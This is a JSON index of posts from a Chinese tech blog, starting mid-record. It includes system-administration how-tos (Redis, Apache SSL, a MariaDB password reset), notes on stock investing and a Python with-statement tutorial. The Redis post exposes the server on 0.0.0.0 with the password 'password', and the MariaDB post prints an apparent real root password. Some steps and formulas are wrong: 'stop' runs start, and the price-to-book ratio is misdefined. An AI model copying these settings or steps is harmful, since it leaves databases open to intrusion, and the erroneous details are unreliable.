本人办理。","categories":[],"tags":[{"name":"杭州","slug":"杭州","permalink":"https://awen.me/tags/%E6%9D%AD%E5%B7%9E/"}]},{"title":"加密你的网盘数据","slug":"加密你的网盘数据","date":"2017-07-31T00:26:19.000Z","updated":"2021-02-26T06:05:29.318Z","comments":true,"path":"posts/3517824053.html","link":"","permalink":"https://awen.me/posts/3517824053.html","excerpt":"现在这个大数据时代，相信绝大多数人都使用网盘，比如百度网盘、360网盘、dropbox、icloud等等。这些厂商都号称对文件进行加密。但是，真的是这样吗？ 还记得百度网盘的8秒教育片事件吗？虽然这是一件“正能量的”数据替换事情，但是你能保证你的数据存储到网盘就不会被窃取，泄漏？前几日百度网盘爆出分享漏洞，有兴趣可以查一查，泄漏了大量的身份证、个人隐私照等等。你也不希望自己传出“艳照门”吧！所以，如何让自己的数据更加安全的托管在这些云盘中才是需要考虑的，下面我来介绍一款开源的跨平台的数据加密软件—Cryptomator","text":"现在这个大数据时代，相信绝大多数人都使用网盘，比如百度网盘、360网盘、dropbox、icloud等等。这些厂商都号称对文件进行加密。但是，真的是这样吗？ 还记得百度网盘的8秒教育片事件吗？虽然这是一件“正能量的”数据替换事情，但是你能保证你的数据存储到网盘就不会被窃取，泄漏？前几日百度网盘爆出分享漏洞，有兴趣可以查一查，泄漏了大量的身份证、个人隐私照等等。你也不希望自己传出“艳照门”吧！所以，如何让自己的数据更加安全的托管在这些云盘中才是需要考虑的，下面我来介绍一款开源的跨平台的数据加密软件—Cryptomator Cryptomator 支持mac windows iphone android linux 系统。它的特点： 完全透明：像个U盘一样，只工作在加密盘。 与本地目录同步，支持Dropbox、OneDrive、Google Drive等任何云存储网盘。 可用于加密任意多个文件夹。 加密的多个文件夹。每个都有独立的密码。 使用256位秘钥长度的ASE加密算法。 加密过程基于客户端：无需账户注册，无需任何在线服务。 同时加密文件名。 无需提供任何第三方服务凭据。 开源意味着：没有后门。 没有商业利益。 通过加密后，得到的文件如下所示 而解密需要在本地进行，速度也非常快。 如何使用下载安装完毕后，选择你的网盘同步目录，它会在目录中创建一个文件夹，然后设置密码，注意这个密码一定要记住，丢失则无法找回数据，推荐使用1password等工具储存。 设置完毕后会创建一个本地虚拟磁盘，你的原始数据就拖到这里来，然后会自动进行加密。还是很方便的。","categories":[],"tags":[{"name":"网盘","slug":"网盘","permalink":"https://awen.me/tags/%E7%BD%91%E7%9B%98/"}]},{"title":"股票知识","slug":"股票知识","date":"2017-07-28T05:45:52.000Z","updated":"2021-02-26T06:05:29.354Z","comments":true,"path":"posts/1022538732.html","link":"","permalink":"https://awen.me/posts/1022538732.html","excerpt":"股票可以干什么和上市公司共担风险、共享收益 1.分红：时间比较久2.买卖差价：低买高卖 好的股票收益远远超过债券、货币基金等投资品，可以跑赢通胀。比如腾讯的股票在2004年在香港上市，迄今为止涨幅300多倍。","text":"股票可以干什么和上市公司共担风险、共享收益 1.分红：时间比较久2.买卖差价：低买高卖 好的股票收益远远超过债券、货币基金等投资品，可以跑赢通胀。比如腾讯的股票在2004年在香港上市，迄今为止涨幅300多倍。 A股是什么在深圳和上海交易所上市的公司，统称为A股市场 什么是大盘大盘是指在上交所和深交所上市的公司涨幅的总和。 什么是主板 中小板 创业板股票代码600 表示上交所；以000开头的是深交所，称为主板，主板要求最高。股票代码002开头是在深交所上市，称为中小板。股票代码以300开头的，在深交所上传，称为创业板，风险比上面的高 准备工作1.学习 系统的方法+良好的心态 2.开户 股票买输入买入股票的最小单位是手，一手等于100股； 平买平卖股票会亏钱，买卖股票有各种手续费 交易佣金： 最低5元/笔，大部分券商是万分之三 印花税 千分之一 卖出收 过户费 在沪市才收取，上交所会收取，深交所不收取 红利税 分红也需要收税 一年以上 无税，1-1年 10%现金红利收取，1个月内 20%收取 股票交易日周末、法定节假日不交易 买卖股票A股 T+1 当天买入 第二个交易日才能卖出 港股、美股 T+0 什么是跌停 涨停在A股 ，比如10元的股票，当天最多涨到11，超过11无效，这叫涨停版，跌也最多只跌1元，10跌1就是9，叫跌停板 一些例外 ST开头的股票 涨跌限制5% 新股上市第一天 涨幅44% 跌幅36% 因重组停牌的上市公司，复牌第一天 没有涨跌限制 其他国外市场没有限制 除权 除息XR 除权 松红股或配股（直接松股票）XD 除息 现金分红DR 除权出息 注：除权除息会导致股票价格向下调整，比如股价10元 每10送10 则股价=5元 停牌停牌股票无法卖出、停牌时间不定，可能几天 几月 几年 哪些情况会停牌 股票连续异常上涨或下跌 涉嫌违规 重大信息公布 如果挑选股票 按行业分 用收益和风险 蓝筹（龙头企业 不太可能倒闭）股本100亿以上，现金分红普遍成长 处于高速发展，业绩超过整个行业，有发展前景的中小公司 特点 总股本不大 没有稳定的现金分红周期 概念 如何判断一家公司的好坏研究股票是一件非常复杂的事情 要定性+定量分析，要建立在管理者的视角来看问题 ##ＳＷＯＴ框架性分析方法 新兴行业前景好，但波动大 传统行业平稳，但是也有区别，比如视频、日用品稳步上升；夕阳产业则动力不足 找到好公司的四个维护，所在行业、竞争对手、竞争优势、发展策略（学习阅读企业的财务报表） 如何阅读财报可以去上交所、深交所官网搜索或新浪、雪球等行情软件、巨潮咨询 财报分类一季报:4月份披露、较为简单半年报:7-8月，内容详细三季报:10月份披露 较为简单年报:一般次年4月前披露，最为详尽，而且需要经过会计事务所审计 财务报告包括 审计报表、会计报表（资产负债表、利润表、现金流量表）、会计报表附注 利润表主要看营业收入和净利润 营业收入-成本-费用-各种税 怎么是否有利润？看今年的和去年的增长了多少 盈利能力毛利率，能看出企业能不能赚钱 比如2016年营业收入10万，营业成本5万，毛利润 10-5=5万，毛利率（10-5）/10=50%5万-人工水电费等等=赚到的钱。 毛利率太低会亏本 资产负债表指财务实力，合理负债是合理的，高负债是危险的 负债尽量不超过50% 企业整体的借款利率（负债成本），查看财务报表利息支出 资产周转率应收账款周转率（指卖出了东西没收到钱）、存货周转率 假设有一个入消费 每次赊账100 ，一年共计1200 ，就是保持着100的应收帐款，如果他每月还一次应收账款周转率就是12，如果是一年一次，那么应收账款周转率就是1。周转率月高，指收账越快，衡量企业的经营能力强不强。 需要在同行对比 现金流量表以利润表为基础、以资产负债表作为参照、现金流量表水分更少。 主要关注经营现金流，最能反映实际经营情况 经营活动现金流=收到的现金-各种成本-税费等现金 如果大于0 企业，说明流入现金大于流出现金，企业可支配的现金比较多反之则说明企业可支配的现金少，可能靠借钱度日 经营活动现金流&gt;净利润 则说明企业赚到的是真金白银 如何买卖一支股票股票是看公司整体估值 市盈率（pe）市盈率=当前每股股价/每股净利润 动态市盈率 预测，容易出现误差静态 计算相对简单，但有滞后性滚动 采用最新真实数据及时作出调整，（推荐） 指标:市盈率处于高位，股价也在高位观察股票过去的最低点和最高点，设置相对比例，比如低于历史数据的20%买入 超过历史数据的80%卖出。 市净率市净率=当前股价/最近年度每股股价，比如一支股票当前价格10元/每股净资产5元=2倍市净率，市净率数值小于1，代表股价相对较为便宜。应用于金融、保险、房地产、制造业等重资产，互联网资产轻，不适合市净率。 什么互联网行业市盈率普遍比传统行业高市盈率要在同行业比较，跨行比较价值不高因为互联网被认为代表未来，利润有极大的上升空间；而传统行业利润稳定 一支股票的价格是不是便宜，而是看估值，市盈利，纵向比较过去的价格，横向比较同行业。 打新股前提： 1.需持有1万元以上的现有股票才可以参与，参与方式是抽签。 技术分析派通常用来做短线交易，利用股票的差价赚钱，相反的就是研究企业的基本面，好公司+好价格；长线交易赚的是上市工商的成长分红，而短线交易则赚的是其他买家手上的钱，有人赚就有入亏，股票本身不创造任何价值。 为什么会出现高买低卖？大部分亏损的最大根源就是非理性，大部分人受股价影响波动而出现非理性决策，因为贪婪，推动股价上涨，而因为恐惧引发股价暴跌。 走技术线需要学习行为金融学 避免赌徒和从众心理18世纪 应该南海公司吹牛包装导致股价从128英镑升到1000英镑，连牛顿也疯狂买股票，所有人都陷入了疯狂，牛顿亏了2w多英镑。所以要对信息进行深入分析，独立思考 避免鸵鸟心理损失厌恶，亏损带来的心理冲击更大，会导致保留亏损的股票 掌握工具技术指标好比乐曲，指标 价格和成交量，技术分析就是分析股票价格过去的规律，推测未来股票的升或跌。 基础的技术指标包括K线、均线、成交量，还要知道其背后波动的原因。 K线k线本质在周期内记录某个商品的价格。 阴和阳 代表看空和看升；反映不同时间的价格 每根k线可以包括不同时期，单位天 周 年 分钟，k线不单适合股市 均线比如5日均线 收盘价格加起来除以5 得到一个点，然后连接起来 1.看股价趋势，当短中长均线全部下移说明大家卖出意愿强，反之看多的人逐渐多。根据金叉死叉买卖股票2.看阻力和支撑均线代表了市场上升的平均成本 成交量成交量反映买卖股票的股数，上涨是红色，反之是绿色。仅限A股市场，反映的是供求关系，成交量大，股价波动剧烈。供过于求，成交量萎缩，股价波动会比较平稳 成交量和价格 量增价升和量减价跌 题外话短线交易要花费大量时间看盘，上班族不适合，赔钱概率大。","categories":[],"tags":[{"name":"股票","slug":"股票","permalink":"https://awen.me/tags/%E8%82%A1%E7%A5%A8/"}]},{"title":"redis 配置密码和外网访问","slug":"redis-配置密码和外网访问","date":"2017-07-26T13:08:40.000Z","updated":"2021-02-26T06:05:29.290Z","comments":true,"path":"posts/1407361056.html","link":"","permalink":"https://awen.me/posts/1407361056.html","excerpt":"配置外网访问修改配置文件 bind 0.0.0.0设置密码requirepass password","text":"配置外网访问修改配置文件 bind 0.0.0.0设置密码requirepass password 设置进程daemonize yes修改默认端口port 6379开启redis进程redis-server /etc/redis.conf开机启动#vim /etc/init.d/redis-server #! /bin/sh ### BEGIN INIT INFO # Provides: redis-server # Required-Start: $syslog # Required-Stop: $syslog # Should-Start: $local_fs # Should-Stop: $local_fs # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: redis-server - Persistent key-value db # Description: redis-server - Persistent key-value db ### END INIT INFO PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin DAEMON=/usr/local/bin/redis-server DAEMON_ARGS=/etc/redis.conf NAME=redis-server DESC=redis-server PIDFILE=/var/run/redis.pid test -x $DAEMON || exit 0 test -x $DAEMONBOOTSTRAP || exit 0 set -e case &quot;$1&quot; in start) echo -n &quot;Starting $DESC: &quot; touch $PIDFILE chown redis:redis $PIDFILE if start-stop-daemon --start --quiet --umask 007 --pidfile $PIDFILE --chuid redis:redis --exec $DAEMON --background -- $DAEMON_ARGS then echo &quot;$NAME.&quot; else echo &quot;failed&quot; fi ;; stop) echo -n &quot;Stopping $DESC: &quot; if start-stop-daemon --stop --retry 10 --quiet --oknodo --pidfile $PIDFILE --exec $DAEMON then echo &quot;$NAME.&quot; else echo &quot;failed&quot; fi rm -f $PIDFILE ;; restart|force-reload) ${0} stop ${0} start ;; *) echo &quot;Usage: /etc/init.d/$NAME {start|stop|restart|force-reload}&quot; &gt;&amp;2 exit 1 ;; esac exit 0赋予权限 chmod +x /etc/init.d/redis-server设置开机启动 update-rc.d redis-server defaults连接redis-cli -h 10.0.6.60 -p 6379 -a password或者 ➜ ~ redis-cli -h 10.0.6.60 -p 6379 10.0.6.60:6379&gt; AUTH password OK 10.0.6.60:6379&gt; ping PONG 10.0.6.60:6379&gt;","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"Apache配置ssl证书","slug":"Apache配置ssl证书","date":"2017-07-25T08:07:05.000Z","updated":"2021-02-26T06:05:29.240Z","comments":true,"path":"posts/1507260047.html","link":"","permalink":"https://awen.me/posts/1507260047.html","excerpt":"安装apache# yum -y install httpd配置httpd.conf1.新建一个虚拟主机，我们配置域名为apache.v5linux.com cp /usr/share/doc/httpd-2.4.6/httpd-vhosts.conf /etc/httpd/conf.d/01-v5linux.com.conf","text":"安装apache# yum -y install httpd配置httpd.conf1.新建一个虚拟主机，我们配置域名为apache.v5linux.com cp /usr/share/doc/httpd-2.4.6/httpd-vhosts.conf /etc/httpd/conf.d/01-v5linux.com.conf 2.修改配置文件 # vim 01-v5linux.com.conf &lt;VirtualHost *:80&gt; #ServerAdmin webmaster@dummy-host.example.com DocumentRoot &quot;/var/www/v5linux/&quot; ServerName apache.v5linux.com ServerAlias apache.v5linux.com ErrorLog &quot;/var/log/httpd/apache-v5linux-error_log&quot; CustomLog &quot;/var/log/httpd/apache-v5linux-access_log&quot; common &lt;/VirtualHost&gt;3.重启apache [root@centos-1gb-sfo2-01 conf.d]# systemctl enable httpd Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service. [root@centos-1gb-sfo2-01 conf.d]# systemctl start httpd4.创建目录 [root@centos-1gb-sfo2-01 conf.d]# cd /var/www/ [root@centos-1gb-sfo2-01 www]# mkdir v5linux5.写入一个测试html [root@centos-1gb-sfo2-01 v5linux]# vim index.html [root@centos-1gb-sfo2-01 v5linux]# cat index.html this is apache.v5linux.com6.做下域名解析，指向apache.v5linux.com 然后等解析生效后访问 配置证书申请证书查看这篇文章https://awen.me/post/248023261.html 申请成功，会有提示 [Tue Jul 25 08:24:08 UTC 2017] Your cert is in /root/.acme.sh/apache.v5linux.com/apache.v5linux.com.cer [Tue Jul 25 08:24:08 UTC 2017] Your cert key is in /root/.acme.sh/apache.v5linux.com/apache.v5linux.com.key [Tue Jul 25 08:24:08 UTC 2017] The intermediate CA cert is in /root/.acme.sh/apache.v5linux.com/ca.cer [Tue Jul 25 08:24:08 UTC 2017] And the full chain certs is there: /root/.acme.sh/apache.v5linux.com/fullchain.cer将证书拷贝到/etc/httpd/ssl目录，当然您愿意放哪里都可以 [root@centos-1gb-sfo2-01 conf]# mkdir /etc/httpd/ssl [root@centos-1gb-sfo2-01 conf]# cp -rf /root/.acme.sh/apache.v5linux.com/ /etc/httpd/ssl/安装apache ssl模块1.安装 yum install -y mod_ssl2.查看 [root@centos-1gb-sfo2-01 conf.modules.d]# ls /etc/httpd/modules/ | grep &quot;mod_ssl&quot; mod_ssl.so3.其配置文件在/etc/httpd/conf.modules.d下的00-ssl.conf [root@centos-1gb-sfo2-01 conf.modules.d]# ls 00-base.conf 00-dav.conf 00-lua.conf 00-mpm.conf 00-proxy.conf 00-ssl.conf 00-systemd.conf 01-cgi.conf [root@centos-1gb-sfo2-01 conf.modules.d]# vim 00-ssl.conf [root@centos-1gb-sfo2-01 conf.modules.d]# cat 00-ssl.conf LoadModule ssl_module modules/mod_ssl.so5.编辑etc/httpd/conf.d/ssl.conf 文件，修改如下几行 &lt;VirtualHost _default_:443&gt; # General setup for the virtual host, inherited from global configuration DocumentRoot &quot;/var/www/v5linux&quot; #修改为自己的web目录 ServerName apache.v5linux.com:443 # 修改为自己的域名 SSLCertificateFile /etc/pki/tls/certs/localhost.crt #修改为自己的公钥路径 SSLCertificateKeyFile /etc/pki/tls/private/localhost.key #修改为自己的私钥路径如图所示 然后重启httpd systemctl restart httpd再次访问 这种方法是http也可以访问，https也可以访问，如果说你希望访问http跳转到https，则修改/etc/httpd/conf.d/01-v5linux.com.conf端口的配置 &lt;VirtualHost *:80&gt; #ServerAdmin webmaster@dummy-host.example.com DocumentRoot &quot;/var/www/v5linux/&quot; ServerName apache.v5linux.com ServerAlias apache.v5linux.com ErrorLog &quot;/var/log/httpd/apache-v5linux-error_log&quot; CustomLog &quot;/var/log/httpd/apache-v5linux-access_log&quot; common #开启rewrite RewriteEngine on RewriteCond %{SERVER_PORT} !^443$ RewriteRule ^(.*)?$ https://%{SERVER_NAME}/ [L,R] &lt;/VirtualHost&gt;","categories":[],"tags":[]},{"title":"开始使用fish","slug":"开始使用fish","date":"2017-07-22T09:30:42.000Z","updated":"2021-02-26T06:05:29.333Z","comments":true,"path":"posts/3397619508.html","link":"","permalink":"https://awen.me/posts/3397619508.html","excerpt":"用mac一年多了，一直使用zsh，不过最近一直感觉用iterm2打开新标签奇卡无比，排查一番之后发现是nvm的郭，注释掉掉~/.zshrc中的nvm环境变量设置后 速度要快很多，但是每次都要忍受这样的速度实在受不了。我的解决颁发是默认使用fish，需要用到node的时候切换到zsh 因为fish的默认配置非常好用了，开箱即用","text":"用mac一年多了，一直使用zsh，不过最近一直感觉用iterm2打开新标签奇卡无比，排查一番之后发现是nvm的郭，注释掉掉~/.zshrc中的nvm环境变量设置后 速度要快很多，但是每次都要忍受这样的速度实在受不了。我的解决颁发是默认使用fish，需要用到node的时候切换到zsh 因为fish的默认配置非常好用了，开箱即用 安装brew install fish#使用 从zsh 切换到fish ➜ wwwroot fish Welcome use awen mac ❰wenjun❙~/Documents/wwwroot❱✔≻永久切换 chsh -s /usr/local/bin/fish如果上面的命令不成功，确保/etc/shells 有fish的路径 ➜ wwwroot cat /etc/shells # List of acceptable shells for chpass(1). # Ftpd will not allow users to connect who are not using # one of these shells. /bin/bash /bin/csh /bin/ksh /bin/sh /bin/tcsh /bin/zsh /usr/local/bin/fish默认清空下，不需要任何配置，fish就已经很好用了 配置输入 fish_config 可以进行终端配置 踩坑: mac下提示无权限在~/.cache目录下创建文件或目录，赋予其权限即可 然后会打开下面的页面进行设置 设置完毕后，在终端输入stop 退出后重新打开终端即可 ❰wenjun❙~❱✔≻ fish_config Web config started at &apos;file:///Users/wenjun/.cache/fish/web_config-1GXVGY.html&apos;. Hit enter to stop. stop Shutting down.更多用法参考官网https://fishshell.com/","categories":[],"tags":[{"name":"fish","slug":"fish","permalink":"https://awen.me/tags/fish/"}]},{"title":"鼠须管在iterm2无法输入中文","slug":"鼠须管在iterm2无法输入中文-2","date":"2017-07-22T06:47:37.000Z","updated":"2021-02-26T06:05:29.360Z","comments":true,"path":"posts/3856258311.html","link":"","permalink":"https://awen.me/posts/3856258311.html","excerpt":"在mac下使用鼠须管，发现在iterm2中无法切换到中文","text":"在mac下使用鼠须管，发现在iterm2中无法切换到中文 解决1.选择用户设定 2.找到squirrel.yaml 将配置文件中的 com.googlecode.iterm2: ascii_mode: true设置为 com.googlecode.iterm2: ascii_mode: false3.然后同步数据即可","categories":[],"tags":[{"name":"鼠须管","slug":"鼠须管","permalink":"https://awen.me/tags/%E9%BC%A0%E9%A1%BB%E7%AE%A1/"}]},{"title":"pycharm debug 的使用","slug":"pycharm-debug-的使用","date":"2017-07-20T03:20:46.000Z","updated":"2021-02-26T06:05:29.281Z","comments":true,"path":"posts/38094.html","link":"","permalink":"https://awen.me/posts/38094.html","excerpt":"pycharm 是一个 python 的 IDE 功能强大，本文主要讲解如何使用断点 debug 调试程序","text":"pycharm 是一个 python 的 IDE 功能强大，本文主要讲解如何使用断点 debug 调试程序 1.首先在要调试的代码左侧点击下会出现一个红点。 2.然后点击右上角的 debug 按钮 3.会看到 debug 的结果 4.将鼠标悬停在这几个按钮可以看到按钮的作用和快捷键。主要是用来让程序进入下一步观察右侧Variables 中的对应变量的变化。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"mariadb 重置密码","slug":"mariadb-重置密码","date":"2017-07-19T05:40:37.000Z","updated":"2021-02-26T06:05:29.278Z","comments":true,"path":"posts/223599102.html","link":"","permalink":"https://awen.me/posts/223599102.html","excerpt":"如果忘记数据库密码，可以做下面的操作进行重置 停止数据库root@Techs-Public:~# /etc/init.d/mariadb start","text":"如果忘记数据库密码，可以做下面的操作进行重置 停止数据库root@Techs-Public:~# /etc/init.d/mariadb start 重置密码root@Techs-Public:~# mysqld_safe --skip-grant-tables &amp; [2] 21207 root@Techs-Public:~# 170719 13:39:43 mysqld_safe Logging to &apos;/usr/local/mariadb/var/mariadb.err&apos;. 170719 13:39:43 mysqld_safe A mysqld process already exists mysql -u root -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 3 Server version: 10.1.23-MariaDB Source distribution Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others. Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. MariaDB [(none)]&gt; use mysql; Database changed MariaDB [mysql]&gt; MariaDB [mysql]&gt; update user set password=PASSWORD(&apos;upyun@#techs&apos;) where user=&quot;root&quot;; Query OK, 3 rows affected (0.00 sec) Rows matched: 3 Changed: 3 Warnings: 0 MariaDB [mysql]&gt; flush privileges; Query OK, 0 rows affected (0.00 sec) MariaDB [mysql]&gt;quit启动数据库root@Techs-Public:~# /etc/init.d/mariadb start [ ok ] Starting mariadb (via systemctl): mariadb.service. root@Techs-Public:~# mysql -u root -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 5 Server version: 10.1.23-MariaDB Source distribution Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others. Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. MariaDB [(none)]&gt;","categories":[],"tags":[{"name":"mariadb","slug":"mariadb","permalink":"https://awen.me/tags/mariadb/"}]},{"title":"python with语句","slug":"python-with语句","date":"2017-07-18T14:24:53.000Z","updated":"2021-02-26T06:05:29.282Z","comments":true,"path":"posts/2221356637.html","link":"","permalink":"https://awen.me/posts/2221356637.html","excerpt":"with 语句是从 Python 2.5 开始引入的一种与异常处理相关的功能（2.5 版本中要通过 from future import with_statement 导入后才可以使用），从 2.6 版本开始缺省可用（参考 What’s new in Python 2.6? 中 with 语句相关部分介绍）。with 语句适用于对资源进行访问的场合，确保不管使用过程中是否发生异常都会执行必要的“清理”操作，释放资源，比如文件使用后自动关闭、线程中锁的自动获取和释放等。","text":"with 语句是从 Python 2.5 开始引入的一种与异常处理相关的功能（2.5 版本中要通过 from future import with_statement 导入后才可以使用），从 2.6 版本开始缺省可用（参考 What’s new in Python 2.6? 中 with 语句相关部分介绍）。with 语句适用于对资源进行访问的场合，确保不管使用过程中是否发生异常都会执行必要的“清理”操作，释放资源，比如文件使用后自动关闭、线程中锁的自动获取和释放等。 上下文要使用 with 语句，首先要明白上下文管理器这一概念。有了上下文管理器，with 语句才能工作。下面是一组与上下文管理器和with 语句有关的概念。 -上下文管理协议（Context Management Protocol）：包含方法 enter() 和 exit()，支持该协议的对象要实现这两个方法。 上下文管理器（Context Manager）：支持上下文管理协议的对象，这种对象实现了enter() 和 exit() 方法。上下文管理器定义执行 with 语句时要建立的运行时上下文，负责执行 with 语句块上下文中的进入与退出操作。通常使用 with 语句调用上下文管理器，也可以通过直接调用其方法来使用。 运行时上下文（runtime context）：由上下文管理器创建，通过上下文管理器的 enter() 和exit() 方法实现，enter() 方法在语句体执行之前进入运行时上下文，exit() 在语句体执行完后从运行时上下文退出。with 语句支持运行时上下文这一概念。 上下文表达式（Context Expression）：with 语句中跟在关键字 with 之后的表达式，该表达式要返回一个上下文管理器对象。 语句体（with-body）：with 语句包裹起来的代码块，在执行语句体之前会调用上下文管理器的 enter() 方法，执行完语句体之后会执行 exit() 方法。 基本语法和工作原理with 语句的语法格式如下：清单 1. with 语句的语法格式 with context_expression [as target(s)]: with-body这里 context_expression 要返回一个上下文管理器对象，该对象并不赋值给 as 子句中的 target(s) ，如果指定了 as 子句的话，会将上下文管理器的 enter() 方法的返回值赋值给 target(s)。target(s) 可以是单个变量，或者由“()”括起来的元组（不能是仅仅由“,”分隔的变量列表，必须加“()”）。Python 对一些内建对象进行改进，加入了对上下文管理器的支持，可以用于 with 语句中，比如可以自动关闭文件、线程锁的自动获取和释放等。假设要对一个文件进行操作，使用 with 语句可以有如下代码：清单 2. 使用 with 语句操作文件对象 with open(r&apos;somefileName&apos;) as somefile: for line in somefile: print line # ...more code这里使用了 with 语句，不管在处理文件过程中是否发生异常，都能保证 with 语句执行完毕后已经关闭了打开的文件句柄。如果使用传统的 try/finally 范式，则要使用类似如下代码：清单 3. try/finally 方式操作文件对象 somefile = open(r&apos;somefileName&apos;) try: for line in somefile: print line # ...more code finally: somefile.close()比较起来，使用 with 语句可以减少编码量。已经加入对上下文管理协议支持的还有模块 threading、decimal 等。 PEP 0343 对 with 语句的实现进行了描述。with 语句的执行过程类似如下代码块：清单 4. with 语句执行过程 context_manager = context_expression exit = type(context_manager).__exit__ value = type(context_manager).__enter__(context_manager) exc = True # True 表示正常执行，即便有异常也忽略；False 表示重新抛出异常，需要对异常进行处理 try: try: target = value # 如果使用了 as 子句 with-body # 执行 with-body except: # 执行过程中有异常发生 exc = False # 如果 __exit__ 返回 True，则异常被忽略；如果返回 False，则重新抛出异常 # 由外层代码对异常进行处理 if not exit(context_manager, *sys.exc_info()): raise finally: # 正常退出，或者通过 statement-body 中的 break/continue/return 语句退出 # 或者忽略异常退出 if exc: exit(context_manager, None, None, None) # 缺省返回 None，None 在布尔上下文中看做是 False1.执行 context_expression，生成上下文管理器 context_manager调用上下文管理器的 enter() 方法；如果使用了 as 子句，则将 enter() 2.方法的返回值赋值给 as 子句中的 target(s)3.执行语句体 with-body4.不管是否执行过程中是否发生了异常，执行上下文管理器的 exit() 方法，exit() 方法负责执行“清理”工作，如释放资源等。如果执行过程中没有出现异常，或者语句体中执行了语句 break/continue/return，则以 None 作为参数调用 exit(None, None, None) ；如果执行过程中出现异常，则使用 sys.exc_info 得到的异常信息为参数调用 exit(exc_type, exc_value, exc_traceback)5.出现异常时，如果 exit(type, value, traceback) 返回 False，则会重新抛出异常，让with 之外的语句逻辑来处理异常，这也是通用做法；如果返回 True，则忽略异常，不再对异常进行处理 自定义上下文管理器开发人员可以自定义支持上下文管理协议的类。自定义的上下文管理器要实现上下文管理协议所需要的 enter() 和 exit() 两个方法： context_manager.enter() ：进入上下文管理器的运行时上下文，在语句体执行前调用。with 语句将该方法的返回值赋值给 as 子句中的 target，如果指定了 as 子句的话 context_manager.exit(exc_type, exc_value, exc_traceback) ：退出与上下文管理器相关的运行时上下文，返回一个布尔值表示是否对发生的异常进行处理。参数表示引起退出操作的异常，如果退出时没有发生异常，则3个参数都为None。如果发生异常，返回True 表示不处理异常，否则会在退出该方法后重新抛出异常以由 with 语句之外的代码逻辑进行处理。如果该方法内部产生异常，则会取代由 statement-body 中语句产生的异常。要处理异常时，不要显示重新抛出异常，即不能重新抛出通过参数传递进来的异常，只需要将返回值设置为 False 就可以了。之后，上下文管理代码会检测是否 exit() 失败来处理异常 下面通过一个简单的示例来演示如何构建自定义的上下文管理器。注意，上下文管理器必须同时提供 enter() 和 exit() 方法的定义，缺少任何一个都会导致 AttributeError；with 语句会先检查是否提供了 exit() 方法，然后检查是否定义了 enter() 方法。假设有一个资源 DummyResource，这种资源需要在访问前先分配，使用完后再释放掉；分配操作可以放到 enter() 方法中，释放操作可以放到 exit() 方法中。简单起见，这里只通过打印语句来表明当前的操作，并没有实际的资源分配与释放。 清单 5. 自定义支持 with 语句的对象 class DummyResource: def __init__(self, tag): self.tag = tag print &apos;Resource [%s]&apos; % tag def __enter__(self): print &apos;[Enter %s]: Allocate resource.&apos; % self.tag return self # 可以返回不同的对象 def __exit__(self, exc_type, exc_value, exc_tb): print &apos;[Exit %s]: Free resource.&apos; % self.tag if exc_tb is None: print &apos;[Exit %s]: Exited without exception.&apos; % self.tag else: print &apos;[Exit %s]: Exited with exception raised.&apos; % self.tag return False # 可以省略，缺省的None也是被看做是FalseDummyResource 中的 enter() 返回的是自身的引用，这个引用可以赋值给 as 子句中的 target 变量；返回值的类型可以根据实际需要设置为不同的类型，不必是上下文管理器对象本身。exit() 方法中对变量 exc_tb 进行检测，如果不为 None，表示发生了异常，返回 False 表示需要由外部代码逻辑对异常进行处理；注意到如果没有发生异常，缺省的返回值为 None，在布尔环境中也是被看做 False，但是由于没有异常发生，exit() 的三个参数都为 None，上下文管理代码可以检测这种情况，做正常处理。下面在 with 语句中访问 DummyResource ：清单 6. 使用自定义的支持 with 语句的对象 with DummyResource(&apos;Normal&apos;): print &apos;[with-body] Run without exceptions.&apos; with DummyResource(&apos;With-Exception&apos;): print &apos;[with-body] Run with exception.&apos; raise Exception print &apos;[with-body] Run with exception. Failed to finish statement-body!&apos;第1个 with 语句的执行结果如下：清单 7. with 语句1执行结果 Resource [Normal] [Enter Normal]: Allocate resource. [with-body] Run without exceptions. [Exit Normal]: Free resource. [Exit Normal]: Exited without exception.可以看到，正常执行时会先执行完语句体 with-body，然后执行 exit() 方法释放资源。第2个 with 语句的执行结果如下：清单 8. with 语句2执行结果 Resource [With-Exception] [Enter With-Exception]: Allocate resource. [with-body] Run with exception. [Exit With-Exception]: Free resource. [Exit With-Exception]: Exited with exception raised. Traceback (most recent call last): File &quot;G:/demo&quot;, line 20, in &lt;module&gt; raise Exception Exception可以看到，with-body 中发生异常时with-body 并没有执行完，但资源会保证被释放掉，同时产生的异常由 with 语句之外的代码逻辑来捕获处理。可以自定义上下文管理器来对软件系统中的资源进行管理，比如数据库连接、共享资源的访问控制等。Python 在线文档 Writing Context Managers 提供了一个针对数据库连接进行管理的上下文管理器的简单范例。 contextlib 模块contextlib 模块提供了3个对象：装饰器 contextmanager、函数 nested 和上下文管理器 closing。使用这些对象，可以对已有的生成器函数或者对象进行包装，加入对上下文管理协议的支持，避免了专门编写上下文管理器来支持 with 语句。 装饰器 contextmanagercontextmanager 用于对生成器函数进行装饰，生成器函数被装饰以后，返回的是一个上下文管理器，其 enter() 和 exit() 方法由 contextmanager 负责提供，而不再是之前的迭代子。被装饰的生成器函数只能产生一个值，否则会导致异常 RuntimeError；产生的值会赋值给 as 子句中的 target，如果使用了 as 子句的话。下面看一个简单的例子。清单 9. 装饰器 contextmanager 使用示例 from contextlib import contextmanager @contextmanager def demo(): print &apos;[Allocate resources]&apos; print &apos;Code before yield-statement executes in __enter__&apos; yield &apos;*** contextmanager demo ***&apos; print &apos;Code after yield-statement executes in __exit__&apos; print &apos;[Free resources]&apos; with demo() as value: print &apos;Assigned Value: %s&apos; % value结果输出如下：清单 10. contextmanager 使用示例执行结果 [Allocate resources] Code before yield-statement executes in __enter__ Assigned Value: *** contextmanager demo *** Code after yield-statement executes in __exit__ [Free 